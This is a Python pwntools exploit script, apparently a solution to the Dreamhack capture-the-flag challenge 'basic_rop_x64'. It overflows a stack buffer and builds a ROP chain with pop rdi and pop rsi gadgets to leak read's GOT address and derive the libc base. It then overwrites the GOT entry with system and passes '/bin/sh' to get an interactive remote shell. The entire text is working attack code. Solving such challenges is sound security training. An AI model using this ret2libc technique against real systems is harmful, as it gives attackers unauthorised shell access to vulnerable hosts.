from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h'] 

# --------------------- BINARY ACCESS ---------------------- 

# LOCAL
#p = process('./basic_rop_x64')

# LOCAL DEBUGGING ONLY
#gdb.attach(p, 'b *(main+199)')
#pause()

# REMOTE
p = remote('host3.dreamhack.games', 17824)

# -------------- BINARY INFORMATION GATHERING -------------- 

# COMMON
e = ELF('./basic_rop_x64')
rop = ROP(e)

# LOCAL
#libc = e.libc

# REMOTE
libc = ELF('./libc.so.6')


# ------------------ BINARY EXPLOITATION ------------------- 

READ_PLT = p64(e.plt['read'])
READ_GOT = p64(e.got['read'])
WRITE_PLT = p64(e.plt['write'])
WRITE_GOT = p64(e.got['write'])
POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
POP_RSI_R15 = p64((rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0])

print("[+] read plt addr : " + hex(u64(READ_PLT)))
print("[+] read got addr : " + hex(u64(READ_GOT)))
print("[+] write plt addr : " + hex(u64(WRITE_PLT)))
print("[+] write got addr : " + hex(u64(WRITE_GOT)))
print("[+] POP_RDI addr : " + hex(u64(POP_RDI)))
print("[+] POP_RSI_R15 addr : " + hex(u64(POP_RSI_R15)))

PAYLOAD_DUMMY = b'\x90' * 0x40

PAYLOAD = PAYLOAD_DUMMY + b'\x90' * 0x8

PAYLOAD += POP_RDI + p64(1) + POP_RSI_R15 + READ_GOT + p64(0) + WRITE_PLT

PAYLOAD += POP_RDI + p64(0) + POP_RSI_R15 + READ_GOT + p64(0) + READ_PLT

PAYLOAD += POP_RDI + p64(u64(READ_GOT) + 0x8) + READ_PLT


p.send(PAYLOAD)
READ = u64(p.recvuntil('\x7f')[-6:] + b'\x00' * 2)

print('[+] Address of WRITE : ' + hex(READ))
print('[+] Offset of SYSTEM : ' + hex(libc.symbols["system"]))

LIBC_BASE = READ - libc.symbols["read"]
SYSTEM = LIBC_BASE + libc.symbols["system"]

print('[+] LIBC_BASE : ' + hex(LIBC_BASE))
print('[+] SYSTEM : ' + hex(SYSTEM))

p.send(p64(SYSTEM) + b'/bin/sh\x00')

p.interactive()
